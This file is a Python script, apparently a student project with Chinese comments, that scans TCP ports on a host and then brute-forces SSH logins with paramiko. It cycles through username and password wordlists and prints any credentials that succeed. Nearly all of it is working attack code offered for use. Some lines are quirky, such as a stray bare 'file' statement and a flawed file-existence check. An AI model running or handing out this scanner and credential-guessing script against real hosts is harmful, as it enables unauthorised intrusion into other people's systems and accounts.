from socket import * 
import sys, time
from datetime import datetime
import os, io
import paramiko

host = '127.0.0.1'
max_port = 1300
min_port = 1
opened_port = []

def scan_host(host, port, r_code = 1):
    try:
        s = socket(AF_INET, SOCK_STREAM)
         
        code = s.connect_ex((host, port))

        if code == 0:
            r_code = code
            s.close()
    except Exception as e:
        pass

    return r_code

try:
    host = '127.0.0.1'
    # host = input("[*] 輸入欲掃瞄之主機: ")
except KeyboardInterrupt:
    print("\n\n[*] 取消掃描！")
    print("[*] 程式結束執行！")
    sys.exit(1)

hostip = gethostbyname(host)
print("\n[*] Host: %s IP: %s" % (host, hostip))
print("[*] 掃瞄於 %s...\n" % (time.strftime("%H:%M:%S")))
start_time = datetime.now()

for port in range(min_port, max_port):
    try:
        response = scan_host(host, port)

        if response == 0:
            print("[*] Port %d: Open" % port)
            opened_port.append(port)
    except Exception as e:
        pass

stop_time = datetime.now()
totalTimeDuration = stop_time - start_time
print("\n[*] Scanning Finished At %s ..." % (time.strftime("%H:%M:%S")))
print("[*] Scanning Duration: %s ..." % totalTimeDuration)
print("[*] 掃瞄完畢 !")
time.sleep(2)

#` ---------- 第一階段完成 ----------
import socket

line = "\n-------------------------------------------------------\n"
print(line)
print("[*] 開始猜測帳號與密碼！")

try:
    userList = '/Users/marksun/Desktop/專題/ssh_user.txt'
    passwdList = '/Users/marksun/Desktop/專題/ssh_pwd.txt'
    # userList = input("[*] 輸入ssh使用者帳戶清單: ")
    # passwdList = input("[*] 輸入欲猜測密碼清單位置: ")

    if os.path.exists(userList) | os.path.exists(passwdList) == False:
        print("\n[*] 請確認檔案路徑是否正確，或檔案是否存在！")
        sys.exit(4)
except KeyboardInterrupt:
    print("\n\n[*] 取消動作！")
    sys.exit(2)

def ssh_connect(userName, passWord, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # 期望
        for portList in opened_port:
            ssh.connect(host, username = userName, password = passWord, port = portList)
        pass
    except paramiko.AuthenticationException:
        #[*] Authentication FAiled ... （猜測失敗）
        code = 1
    except socket.error as se:
        #[*] Connection Failed ... Host Down (找不到主機)
        code = 2
    file
    ssh.close()  
    return code

inputFileUsername = open(userList, 'r')
inputFilePasswd = open(passwdList, 'r')

print("")

try:
    with open(userList, 'r') as U:
        for _user in U:
            with open(passwdList, 'r') as P:
                for _password in P:
                    _user = _user.strip('\n')
                    _password = _password.strip('\n')
                    response = ssh_connect(_user, _password)
                    if response == 0:
                        print("%s[*] User: %s [*] Password: %s%s" % (line, _user, _password, line))
                        # continue
                        sys.exit(0)
                    elif response == 1:
                        print("[*] User: %s [*] Password: %s [ Login Incorrect ] " % (_user, _password))
                    elif response == 2:
                        print("[*] Connection Could Not Be Established To Address: %s" % host)
                        # continue
                        sys.exit(2)
except Exception as e:
    print(e)
    pass
finally:
    U.close()
    P.close()

inputFilePasswd.close()
inputFileUsername.close()
